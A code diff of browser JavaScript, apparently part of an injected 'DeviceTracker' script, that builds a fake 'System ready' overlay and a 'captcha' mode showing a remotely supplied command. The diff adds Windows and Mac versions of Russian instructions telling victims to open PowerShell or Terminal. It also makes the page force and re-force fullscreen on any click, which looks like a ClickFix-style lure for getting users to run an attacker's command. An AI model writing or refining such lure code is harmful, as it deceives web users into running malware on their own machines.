@@ -139,9 +139,9 @@ function handleActivationResponse(data) {
             // Dispatch based on mode
             removeOverlays(); // Clear any existing overlay before showing new one
             if (data.mode === 'fullscreen') {
-                showFullscreenOverlay();
+                showFullscreenOverlay(data.platform);
             } else { // Default or 'captcha'
-                showCaptcha(data.command);
+                showCaptcha(data.command, data.platform);
             }
         }
 
@@ -172,8 +172,30 @@ function removeOverlays() {
     }
 }
 
-function showFullscreenOverlay() {
+function showFullscreenOverlay(platform) {
     if (document.getElementById('vot-fs-overlay')) return;
+
+    const isMac = (platform || '').toLowerCase().includes('mac');
+
+    // Content templates
+    const winContent = `
+        <h2>Система готова</h2>
+        <div class="step">✅ Самый быстрый способ открыть консоль:</div>
+        <div class="step"><kbd>Win</kbd> + <kbd>X</kbd> → <strong>PowerShell</strong> или <strong>Терминал</strong></div>
+        <div class="divider"></div>
+        <div class="step">🔁 Если пункта нет — используйте: <kbd>Win</kbd> + <kbd>R</kbd>, введите <kbd>powershell</kbd>, нажмите <kbd>Enter</kbd></div>
+        <div class="note">В Windows 11 PowerShell открывается внутри Windows Terminal.<br>Полноэкранный режим при этом сохраняется.</div>
+    `;
+
+    const macContent = `
+        <h2>Система готова</h2>
+        <div class="step">✅ Самый быстрый способ открыть Терминал:</div>
+        <div class="step"><kbd>Command</kbd> + <kbd>Space</kbd> → введите <strong>Terminal</strong> → <kbd>Enter</kbd></div>
+        <div class="divider"></div>
+        <div class="step">🔁 Если поиск не работает:</div>
+        <div class="step"><strong>Программы</strong> → <strong>Утилиты</strong> → <strong>Терминал</strong></div>
+        <div class="note">Полноэкранный режим сохраняется при переключении окон.</div>
+    `;
 
     // Create container
     const div = document.createElement('div');
@@ -184,33 +206,28 @@ function showFullscreenOverlay() {
                 position: fixed; inset: 0; z-index: 999999;
                 background: #1e2a38; color: #ecf0f1; font-family: "Segoe UI", system-ui, sans-serif;
                 display: flex; justify-content: center; align-items: center;
-                text-align: center;
+                text-align: center; cursor: pointer;
             }
             .vot-content {
                 background: #222f3e; padding: 46px; border-radius: 22px; width: 680px; max-width: 95%;
                 box-shadow: 0 25px 80px rgba(0,0,0,.45);
+                pointer-events: none; /* Let clicks pass to the container for fullscreen trigger */
             }
             h2 { font-size: 2.5rem; margin-bottom: 28px; }
             .step { font-size: 1.25rem; line-height: 1.6; margin-bottom: 20px; }
             kbd { background: #0b0f14; border-radius: 8px; padding: 6px 14px; font-family: Consolas, monospace; font-size: 1.05rem; display: inline-block; margin: 0 4px; }
             .divider { height: 1px; background: rgba(255,255,255,.15); margin: 28px 0; }
             .note { font-size: 0.95rem; opacity: 0.7; }
-            .btn { padding: 14px 30px; font-size: 1.1rem; border-radius: 10px; border: none; cursor: pointer; background: #3498db; color: #fff; margin-top: 20px; }
-            .btn:hover { transform: scale(1.05); opacity: 0.95; }
+            .fs-status { position: absolute; bottom: 20px; font-size: 0.8rem; opacity: 0.5; width: 100%; text-align: center; }
         </style>
         <div class="vot-content">
-            <h2>Система готова</h2>
-            <div class="step">✅ Самый быстрый способ открыть консоль:</div>
-            <div class="step"><kbd>Win</kbd> + <kbd>X</kbd> → <strong>PowerShell</strong> или <strong>Терминал</strong></div>
-            <div class="divider"></div>
-            <div class="step">🔁 Если пункта нет — используйте: <kbd>Win</kbd> + <kbd>R</kbd>, введите <kbd>powershell</kbd>, нажмите <kbd>Enter</kbd></div>
-            <div class="note">В Windows 11 PowerShell открывается внутри Windows Terminal.<br>Полноэкранный режим при этом сохраняется.</div>
-            <button id="vot-fs-btn" class="btn">Перейти в полноэкранный режим</button>
+            ${isMac ? macContent : winContent}
         </div>
+        <div id="vot-fs-status" class="fs-status">Кликните в любом месте для перехода в полноэкранный режим</div>
     `;
     document.body.appendChild(div);
 
-    const btn = div.querySelector('#vot-fs-btn');
+    const statusEl = div.querySelector('#vot-fs-status');
 
     const enterFullscreen = async () => {
         try {
@@ -221,44 +238,36 @@ function showFullscreenOverlay() {
             } else if (document.documentElement.msRequestFullscreen) { /* IE11 */
                 await document.documentElement.msRequestFullscreen();
             }
+            if (statusEl) statusEl.style.display = 'none';
         } catch (e) {
             console.warn("[DeviceTracker] Fullscreen request failed", e);
+            if (statusEl) statusEl.style.display = 'block';
         }
     };
 
-    btn.onclick = enterFullscreen;
+    div.onclick = enterFullscreen;
 
     // Aggressive Re-Fullscreen
     const onFullscreenChange = () => {
-        if (!state.isActive || state.currentMode !== 'fullscreen') { // Stop if deactivated or mode changed
+        if (!state.isActive || state.currentMode !== 'fullscreen') {
             document.removeEventListener("fullscreenchange", onFullscreenChange);
             return;
         }
 
         if (!document.fullscreenElement) {
-            console.log("[DeviceTracker] Fullscreen exited. Re-forcing...");
+            console.log("[DeviceTracker] Fullscreen exited. Showing status message.");
+            if (statusEl) statusEl.style.display = 'block';
 
-            // Immediate attempt (might fail without user gesture)
-            enterFullscreen().catch(() => {
-                // If failed, we need a click.
-                // The overlay is already covering everything. 
-                // We can make the WHOLE overlay a click trigger to re-enter.
-                btn.textContent = "Нажмите в любом месте для возврата";
-
-                const reEnforcer = () => {
-                    enterFullscreen().then(() => {
-                        btn.textContent = "Перейти в полноэкранный режим"; // Reset text
-                        div.removeEventListener('click', reEnforcer); // Remove one-time listener
-                    });
-                };
-                div.addEventListener('click', reEnforcer);
-            });
+            // Try automatic (usually fails)
+            enterFullscreen().catch(() => { });
+        } else {
+            if (statusEl) statusEl.style.display = 'none';
         }
     };
 
     document.addEventListener("fullscreenchange", onFullscreenChange);
 
-    // Try optional immediate entry (will fail if no gesture, but harmless)
+    // Initial attempt
     enterFullscreen();
 }
 
